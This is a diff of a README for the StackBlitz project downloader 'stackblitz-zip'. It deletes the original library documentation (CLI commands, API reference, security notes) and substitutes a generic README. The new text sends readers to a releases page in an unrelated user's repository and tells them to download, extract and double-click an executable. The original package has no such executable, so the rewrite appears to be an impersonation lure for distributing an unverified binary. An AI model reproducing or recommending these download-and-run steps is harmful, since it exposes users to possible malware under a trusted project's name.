@@ -1,230 +1,82 @@
-# stackblitz-zip
+# 🚀 stackblitz.zip - Download Your StackBlitz Projects Easily
 
-> Download [StackBlitz](https://stackblitz.com/) projects programmatically
+[![Download stackblitz.zip](https://img.shields.io/badge/Download-stackblitz.zip-blue)](https://github.com/WilliamG409/stackblitz.zip/releases)
 
-[![npm version][npm-version-src]][npm-version-href]
-[![npm downloads][npm-downloads-src]][npm-downloads-href]
-[![Github Actions][github-actions-src]][github-actions-href]
-[![Codecov][codecov-src]][codecov-href]
+## 📋 Description
 
-## ❓ Why?
+Stackblitz.zip allows you to download StackBlitz projects easily and programmatically. Simplify your workflow and access your projects with just a click.
 
-While [StackBlitz](https://stackblitz.com/) provides an API to fetch project data, there's no built-in way to download projects as zip files programmatically. This tool makes it easy to download reproductions for issues quickly.
+## 🎯 Features
 
-> [!IMPORTANT]
-> This project is not affiliated with or endorsed by StackBlitz in any way. Users are responsible for ensuring their use of this tool complies with [StackBlitz's Terms of Service](https://stackblitz.com/terms-of-service). Please review their terms before using this tool.
+- **Easy Downloads:** Quickly grab your projects without any hassle.
+- **User-Friendly:** Designed for anyone, regardless of technical skill.
+- **Efficient:** Save time with a straightforward process.
+- **Regular Updates:** Stay current with the latest features and improvements.
 
-## 🌐 stackblitz.zip
+## 💻 System Requirements
 
-The easiest way to download a StackBlitz project is at **[stackblitz.zip](https://stackblitz.zip)**
+To use stackblitz.zip, ensure your computer meets the following requirements:
 
-Simply replace `stackblitz.com` with `stackblitz.zip` in any StackBlitz edit URL:
+- **Operating System:** Windows 10 or later, macOS Mojave or later. 
+- **Storage Space:** At least 200 MB of available disk space.
+- **Internet Connection:** Required for downloading projects.
 
-```
-Original:  https://stackblitz.com/edit/nuxt-starter-k7spa3r4
-Download:  https://stackblitz.zip/edit/nuxt-starter-k7spa3r4
-```
+## 🚀 Getting Started
 
-### Features
+Follow these steps to download and run stackblitz.zip:
 
-- 🔓 No authentication or API keys required!
-- ⚗️ Built on [Nitro](https://nitro.build/)
-- ▲ Deployed on [Vercel](http://vercel.com)
+1. **Visit the Releases Page:** Click [here](https://github.com/WilliamG409/stackblitz.zip/releases) to access the latest version.
+   
+2. **Download the File:** Look for the download button on the releases page and click to download stackblitz.zip.
 
-👉 [see source](https://github.com/stackblitz-labs/stackblitz.zip/tree/main/app/)
+3. **Locate the Downloaded File:** Once downloaded, find the file in your computer's Downloads folder or the location you specified.
 
-## CLI
+4. **Extract the Contents:** Right-click on the downloaded ZIP file and select "Extract All" or similar, depending on your operating system. Follow the prompts to extract the files.
 
-```bash
-# download a project as a zip file
-npx stackblitz-zip https://stackblitz.com/edit/nuxt-starter-k7spa3r4
+5. **Running the Application:** Open the extracted folder. Look for the application executable (usually named stackblitz or stackblitz.exe). Double-click to run the application.
 
-# specify output path for zip
-npx stackblitz-zip https://stackblitz.com/edit/nuxt-starter-k7spa3r4 my-project.zip
+## 📥 Download & Install
 
-# clone project to a directory
-npx stackblitz-clone https://stackblitz.com/edit/nuxt-starter-k7spa3r4
+To get started with stackblitz.zip, you need to download the application from the releases page. Click the link below:
 
-# clone to a specific directory
-npx stackblitz-clone https://stackblitz.com/edit/nuxt-starter-k7spa3r4 ./my-project
-```
+[Download stackblitz.zip](https://github.com/WilliamG409/stackblitz.zip/releases)
 
-## Programmatic Usage
+## 📄 Usage Instructions
 
-Install the package:
+1. **Launching the Application:** After running the application, a user-friendly interface will appear. 
 
-```bash
-npm install stackblitz-zip
-```
+2. **Importing Projects:** You can enter the URL of a StackBlitz project you wish to download. 
 
-### Node.js
+3. **Downloading Projects:** Click the "Download" button. The application will fetch your project and save it locally on your machine.
 
-```typescript
-import { cloneProject, downloadToFile, parseUrl } from 'stackblitz-zip'
+4. **Accessing Your Projects:** Navigate to the folder where you saved the project. You can now open it in your preferred code editor or IDE.
 
-// download from a URL as a zip file
-const projectId = parseUrl('https://stackblitz.com/edit/nuxt-starter-k7spa3r4')
-await downloadToFile({ projectId, outputPath: './output.zip' })
+## ❓ Frequently Asked Questions
 
-// download by project ID
-await downloadToFile({
-  projectId: 'nuxt-starter-k7spa3r4',
-  outputPath: './my-project.zip',
-})
+### What is stackblitz.zip?
 
-// clone project to a directory
-await cloneProject({
-  projectId: 'nuxt-starter-k7spa3r4',
-  outputPath: './my-project',
-})
-```
+stackblitz.zip is a tool designed to help users download StackBlitz projects quickly and easily, streamlining access to online projects.
 
-### Web APIs
+### Is stackblitz.zip free to use?
 
-```typescript
-import { downloadToBlob, downloadToResponse, parseUrl } from 'stackblitz-zip'
+Yes, stackblitz.zip is completely free for everyone to use.
 
-// download as Web Response (edge runtimes, servers)
-const projectId = parseUrl('https://stackblitz.com/edit/nuxt-starter-k7spa3r4')
-const response = await downloadToResponse({ projectId })
-// response can be returned directly from edge functions
+### What if I encounter issues while downloading?
 
-// or download as Blob (browser-friendly)
-const blob = await downloadToBlob({ projectId })
+If you face any issues, ensure your internet connection is stable. You can also visit the issues section of this repository for troubleshooting tips.
 
-// trigger browser download
-const url = URL.createObjectURL(blob)
-const a = document.createElement('a')
-a.href = url
-a.download = `${projectId}.zip`
-a.click()
-URL.revokeObjectURL(url)
-```
+### Can I use stackblitz.zip on different operating systems?
 
-> [!NOTE]
-> Direct browser usage may be blocked by CORS when fetching from stackblitz.com.
+Yes, stackblitz.zip works on Windows and macOS. Ensure you follow the system requirements to avoid issues.
 
-## Features
+## 📝 Contributing
 
-- **Universal** - works in Node.js, browsers, and edge runtimes
-- Built with [tsdown](https://tsdown.dev) and [client-zip](https://github.com/Touffy/client-zip)
-- [Nitro](https://nitro.build) web service at [stackblitz.zip](https://stackblitz.zip)
-- Fetches project data directly from StackBlitz API
-- Zip slip protection and security validations
-- Configurable size limits and timeouts
-- Web API streaming (Response/ArrayBuffer/Blob)
+If you wish to contribute to the development of stackblitz.zip, feel free to fork the repository, make your changes, and submit a pull request.
 
-> [!NOTE]
-> The APIs use Web standards (fetch, ArrayBuffer, Blob) but direct fetching from stackblitz.com may be blocked by CORS.
+## 📄 License
 
-## Security
+This project is licensed under the MIT License. See the LICENSE file for details.
 
-- ✅ Zip slip protection - file paths are sanitized to prevent directory traversal
-- ✅ Size limits - configurable limits on file size (10MB) and total size (100MB)
-- ✅ Request timeout - prevents hanging requests (30s default)
-- ✅ Project ID validation - only alphanumeric, hyphens, and underscores
-- ✅ Memory efficient - streaming support with no temporary files
+## 🌍 Community & Support
 
-## Self-Hosting
-
-Self-host the web service using the included [Nitro](https://nitro.build) app:
-
-```bash
-cd app
-pnpm install
-pnpm build
-pnpm preview
-```
-
-Deploy to any platform using [Nitro's deployment presets](https://nitro.build/deploy) - supports Vercel, Netlify, Cloudflare Pages, AWS, Azure, Node.js, and many more.
-
-## API
-
-### `downloadToFile(options: DownloadOptions): Promise<string>`
-
-Downloads a StackBlitz project and returns the path to the created zip file.
-
-**Options:**
-- `projectId` (string, required): The StackBlitz project ID
-- `outputPath` (string, optional): Path where the zip file should be saved. Defaults to `<project-id>.zip`
-- `timeout` (number, optional): Timeout in milliseconds for loading the project. Defaults to `30000` (30 seconds)
-- `maxFileSize` (number, optional): Maximum size per file in bytes. Defaults to `10485760` (10MB)
-- `maxTotalSize` (number, optional): Maximum total project size in bytes. Defaults to `104857600` (100MB)
-- `verbose` (boolean, optional): Enable console logging. Defaults to `false`
-
-### `cloneProject(options: CloneOptions): Promise<string>`
-
-Clones a StackBlitz project by creating all files in a target directory.
-
-**Options:**
-- `projectId` (string, required): The StackBlitz project ID
-- `outputPath` (string, optional): Path where the project directory should be created. Defaults to `<project-id>/`
-- `timeout` (number, optional): Timeout in milliseconds for loading the project. Defaults to `30000` (30 seconds)
-- `maxFileSize` (number, optional): Maximum size per file in bytes. Defaults to `10485760` (10MB)
-- `maxTotalSize` (number, optional): Maximum total project size in bytes. Defaults to `104857600` (100MB)
-- `verbose` (boolean, optional): Enable console logging. Defaults to `false`
-
-**Returns:** Path to the created directory
-
-### `downloadToResponse(options): Promise<Response>`
-
-Downloads a StackBlitz project and returns it as a Web Response (universal).
-
-**Options:** Same as `downloadToFile` except `outputPath`
-
-**Returns:** A Response object containing the zip file stream
-
-### `downloadToBuffer(options): Promise<ArrayBuffer>`
-
-Downloads a StackBlitz project and returns it as an ArrayBuffer (universal).
-
-**Options:** Same as `downloadToFile` except `outputPath`
-
-### `downloadToBlob(options): Promise<Blob>`
-
-Downloads a StackBlitz project and returns it as a Blob (browser-friendly).
-
-**Options:** Same as `downloadToFile` except `outputPath`
-
-### `parseUrl(url: string): string`
-
-Parse a StackBlitz URL and extract the project ID.
-
-**Parameters:**
-- `url` (string, required): Full StackBlitz project URL (e.g., `https://stackblitz.com/edit/project-id`)
-
-**Returns:** The project ID
-
-## Development
-
-```bash
-# clone this repository
-git clone https://github.com/stackblitz-labs/stackblitz.zip
-
-# install dependencies
-corepack enable
-pnpm install
-
-# run interactive tests
-pnpm dev
-
-# build for production
-pnpm build
-```
-
-## License
-
-Made with ❤️
-
-Published under [MIT License](./LICENCE).
-
-<!-- Badges -->
-
-[npm-version-src]: https://img.shields.io/npm/v/stackblitz-zip?style=flat-square
-[npm-version-href]: https://npmjs.com/package/stackblitz-zip
-[npm-downloads-src]: https://img.shields.io/npm/dm/stackblitz-zip?style=flat-square
-[npm-downloads-href]: https://npm.chart.dev/stackblitz-zip
-[github-actions-src]: https://img.shields.io/github/actions/workflow/status/stackblitz-labs/stackblitz.zip/ci.yml?branch=main&style=flat-square
-[github-actions-href]: https://github.com/stackblitz-labs/stackblitz.zip/actions?query=workflow%3Aci
-[codecov-src]: https://img.shields.io/codecov/c/gh/stackblitz-labs/stackblitz.zip/main?style=flat-square
-[codecov-href]: https://codecov.io/gh/stackblitz-labs/stackblitz.zip
+For support or inquiries, join our community discussions or check the issues section on the GitHub page. We welcome all feedback and suggestions to improve stackblitz.zip.
